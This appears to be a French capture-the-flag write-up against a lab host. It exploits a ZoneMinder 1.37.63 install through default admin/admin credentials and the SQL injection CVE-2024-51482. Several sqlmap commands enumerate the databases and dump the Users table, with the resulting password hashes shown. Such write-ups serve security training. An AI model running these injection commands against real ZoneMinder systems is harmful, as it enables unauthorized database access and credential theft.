Une analyse avec `nmap` nous dévoile :
* Port 22 SSH
* Port 80 HTTP

![[Pasted image 20260430131215.png]]
Site de SecureVision, agence de surveillance et sécurité.
Une seule action possible, cliquer sur le bouton "Staff Login".
![[Pasted image 20260430131315.png]]
On analyse ce portail admin. Les credentials admin/admin sont fonctionnels.
![[Pasted image 20260430131503.png]]
Sur les rubriques du haut, on cherche un endroit intéressant à exploiter, comme par exemple Options, Log ou Groups.
On trouve dans Options/API 3 utilisateurs de l'API :
* admin (nous)
* mark
* superadmin
On trouve la version du logiciel ZoneMinder, **1.37.63**, vulnérable à la **CVE-2024-51482**.
En utilisant un [PoC par *connortechnology*](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3), on a accès à l'ensemble des bases de données :
```shell
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie "ZMSESSID=tnrnnaaqr0a7n444ktf1c93ats"
```
La fonction `tid` présente bien la vulnérabilité cherchée, on peut alors en savoir plus sur les DB.
```shell
# Enumération des DB
$ sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie "ZMSESSID=sn0ca7k6q4jn80nlvdgnhrj6mr" --dbms=MySQL --dbs

available databases [3]:
[*] information_schema
[*] performance_schema
[*] zm

# Enumération des tables dans zm
$ sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie "ZMSESSID=vs85u3fm63tjlvare2jm6gujr9" --dbms=MySQL -D zm --tables

Database: zm
[43 tables]
+----------------------+
| Config               | <--- 2
| ControlPresets       |
| Controls             |
| Devices              |
| Event_Data           |
| Event_Summaries      |
| Events_Archived      |
| Events_Day           |
| Events_Hour          |
| Events_Month         |
| Events_Tags          |
| Events_Week          |
| Filters              |
| Frames               |
| Groups_Monitors      | <--- En dernier
| Groups_Permissions   | <--- recours
| Manufacturers        |
| Maps                 |
| Models               |
| MonitorPresets       |
| Monitor_Status       |
| Monitors             |
| Monitors_Permissions |
| MontageLayouts       |
| Object_Types         |
| Reports              |
| Server_Stats         |
| Servers              |
| Sessions             | <--- 4
| Snapshots            |
| Snapshots_Events     |
| States               |
| Stats                |
| Tags                 |
| TriggersX10          |
| User_Preferences     |
| Users                | <--- 1
| ZonePresets          |
| Zones                |
| Events               |
| Groups               |
| Logs                 | <--- 3
| Storage              |
+----------------------+
```
A partir du nom des différentes tables, on veut dump les plus pertinentes :
```shell
# Table Config - rien d'exploitable
$ sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie "ZMSESSID=ek9rk9ggd8c63tfkno21ek2bhs" --dbms=MySQL --threads=10 -D zm -T Config -dump

# Table Users
$ sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie "ZMSESSID=ek9rk9ggd8c63tfkno21ek2bhs" --dbms=MySQL --threads=10 -D zm -T Users -dump
```
Dans la table Users, avant que toutes les colonnes ne soient scannées, on trouve une colonne `Username` et une colonne `Password`. On dump alors directement ces deux colonnes :
```shell
# Users/Password de la table users
$ sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie "ZMSESSID=ek9rk9ggd8c63tfkno21ek2bhs" --dbms=MySQL --threads=10 -D zm -T Users -C "Username,Password" -dump

+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
+------------+--------------------------------------------------------------+
```

